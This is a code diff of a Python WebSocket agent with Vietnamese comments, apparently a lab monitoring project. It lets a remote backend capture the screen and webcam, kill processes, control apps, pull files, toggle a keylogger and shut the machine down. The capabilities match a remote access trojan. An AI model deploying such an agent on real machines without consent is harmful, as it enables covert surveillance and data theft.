@@ -1,25 +1,66 @@
 import json
 import time
 import threading
+import base64
+import io
 import websocket  # Thư viện kết nối WebSocket thuần
+
+# Thư viện phục vụ Webcam
+import cv2
 
 # Import các hàm chức năng từ thư mục con modules/
 from modules.system import get_process_list, kill_process_by_pid, execute_power_cmd
 from modules.media import capture_screen_to_base64
+from modules.app_control import manage_application
+from modules.sandbox import get_sandbox_files, read_file_content
+# Import module keylogger mới tách lớp
+from modules.keylogger import start_keylogger_module, stop_keylogger_module
 
 MACHINE_NAME = 'Kali_Lab_01'
+webcam_streaming = False
+
+
+def webcam_stream_worker(ws):
+    """Luồng phụ chạy độc lập chịu trách nhiệm đọc camera bằng OpenCV và nén ảnh gửi về"""
+    global webcam_streaming
+    print("🎥 [WEBCAM] Khởi chạy Worker ghi hình...")
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        print("❌ [WEBCAM] Không thể mở thiết bị ghi hình (Webcam)")
+        webcam_streaming = False
+        return
+
+    while webcam_streaming:
+        ret, frame = cap.read()
+        if not ret:
+            break
+        try:
+            frame_resized = cv2.resize(frame, (640, 480))
+            _, buffer = cv2.imencode('.jpg', frame_resized, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
+            img_base64 = base64.b64encode(buffer).decode('utf-8')
+            payload = {
+                "command": "agent_send_webcam",
+                "machine_name": MACHINE_NAME,
+                "image_base64": img_base64
+            }
+            if ws.sock and ws.sock.connected:
+                ws.send(json.dumps(payload))
+        except Exception as e:
+            print(f"❌ Lỗi truyền gói tin camera: {e}")
+        time.sleep(0.25)
+    cap.release()
 
 
 def on_message(ws, message):
     """Lắng nghe lệnh điều khiển trực tiếp từ FastAPI Backend dội xuống"""
+    global webcam_streaming
+    
     try:
         data = json.loads(message)
         command = data.get('command')
         data_args = data.get('data', {})
 
-        # 🎯 LUỒNG CHỤP MÀN HÌNH (STATIC & LIVE CHẠY CHUNG):
-        # Vì Frontend tự lo vòng lặp (re-trigger), Agent cứ nhận lệnh 'take_screenshot' 
-        # là âm thầm chụp đúng 1 tấm gửi về, không in log ra terminal để tránh bị tràn màn hình (loop log).
+        # 🎯 LUỒNG CHỤP MÀN HÌNH (SCREENSHOT & LIVE STREAM)
         if command == 'take_screenshot':
             base64_image = capture_screen_to_base64()
             if base64_image:
@@ -27,19 +68,17 @@ def on_message(ws, message):
                     "command": "agent_send_screen",
                     "machine_name": MACHINE_NAME,
                     "image_base64": base64_image,
-                    "is_static": True  # Giữ cờ hiệu để bộ lọc của monitor.js bóc tách đúng tab
+                    "is_static": True
                 }
                 ws.send(json.dumps(payload))
             return
 
-        # 🎯 LUỒNG QUẢN LÝ TIẾN TRÌNH (TASK MANAGER):
+        # 🎯 LUỒNG QUẢN LÝ TIẾN TRÌNH (TASK MANAGER)
         elif command == 'kill_process':
-            print(f"📥 [COMMAND] Nhận lệnh kill tiến trình từ hệ thống.")
             pid = data_args.get('pid') if isinstance(data_args, dict) else None
             if pid:
                 pid = int(pid)
                 if kill_process_by_pid(pid):
-                    print(f"✅ Đã kill thành công PID {pid}. Gửi lại danh sách tiến trình mới...")
                     ws.send(json.dumps({
                         "command": "agent_send_procs",
                         "machine_name": MACHINE_NAME,
@@ -47,9 +86,60 @@ def on_message(ws, message):
                     }))
             return
 
-        # 🎯 LUỒNG ĐIỀU KHIỂN NGUỒN HỆ THỐNG:
+        # 🎯 LUỒNG ĐIỀU KHIỂN BẬT/TẮT ỨNG DỤNG WHITELIST
+        elif command == 'manage_app':
+            action = data_args.get('action')
+            app_name = data_args.get('app_name')
+            manage_application(action, app_name)
+            return
+
+        # 🎯 LUỒNG ĐIỀU KHIỂN THIẾT BI GHI HÌNH WEBCAM
+        elif command == 'get_webcam_frame':
+            if not webcam_streaming:
+                webcam_streaming = True
+                threading.Thread(target=webcam_stream_worker, args=(ws,), daemon=True).start()
+            return
+
+        elif command == 'stop_webcam_stream':
+            webcam_streaming = False
+            return
+
+        # 🎯 LUỒNG TRUY XUẤT DANH SÁCH TỆP TIN (FILE SANDBOX)
+        elif command == 'list_directory':
+            files = get_sandbox_files()
+            ws.send(json.dumps({
+                "command": "agent_send_files",
+                "machine_name": MACHINE_NAME,
+                "files": files
+            }))
+            return
+
+        # 🎯 LUỒNG TRÍCH XUẤT NỘI DUNG FILE ĐỂ TẢI VỀ WEB
+        elif command == 'read_file_content':
+            file_title = data_args.get('file_name')
+            file_payload = read_file_content(file_title)
+            if file_payload:
+                ws.send(json.dumps({
+                    "command": "agent_download_ready",
+                    "machine_name": MACHINE_NAME,
+                    "file_name": file_payload["file_name"],
+                    "file_base64": file_payload["file_base64"]
+                }))
+            return
+
+        # 🎯 LUỒNG KIỂM SOÁT PHÍM BẤM THỰC HÀNH (KEYLOGGER DEMO CHUẨN ĐẠO ĐỨC)
+        elif command == 'toggle_keylogger':
+            capturing = data_args.get('capturing', True)
+            if capturing:
+                # Gọi hàm module kích hoạt bảng popup và bật listener
+                start_keylogger_module(ws, MACHINE_NAME)
+            else:
+                # Gọi hàm module cưỡng bức dừng bắt phím và xóa popup
+                stop_keylogger_module()
+            return
+
+        # 🎯 LUỒNG ĐIỀU KHIỂN NGUỒN HỆ THỐNG
         elif command in ['shutdown', 'restart']:
-            print(f"⚠️ [POWER] Thực thi điều khiển nguồn: {command.upper()}")
             execute_power_cmd(command.upper())
 
     except Exception as e:
@@ -58,16 +148,17 @@ def on_message(ws, message):
 
 def on_open(ws):
     print(f"✅ [CONNECTED] Đã thông nòng kết nối WebSocket tới FastAPI! Tên máy: {MACHINE_NAME}")
-    # Đăng ký định danh máy trạm với Server ngay khi mở cổng thành công
     ws.send(json.dumps({"event": "agent_register", "machine_name": MACHINE_NAME}))
 
 
 def on_close(ws, close_status_code, close_msg):
-    print("❌ [DISCONNECTED] Mất kết nối tới Server Backend.")
+    global webcam_streaming
+    print("❌ [DISCONNECTED] Mất kết nối tới Server Backend. Hủy toàn bộ luồng phụ.")
+    webcam_streaming = False
+    stop_keylogger_module()
 
 
 if __name__ == '__main__':
-    # Đường dẫn IP mạng Wi-Fi/Host-only của máy Windows đang chạy FastAPI Backend
     BACKEND_WS_URL = f"ws://192.168.89.134:8000/ws/agent/{MACHINE_NAME}"
 
     ws_client = websocket.WebSocketApp(
@@ -92,6 +183,4 @@ if __name__ == '__main__':
             time.sleep(5)
 
     threading.Thread(target=sys_monitor_loop, daemon=True).start()
-
-    # Kích hoạt duy trì lắng nghe cổng mạng liên tục từ WebSocket
     ws_client.run_forever()
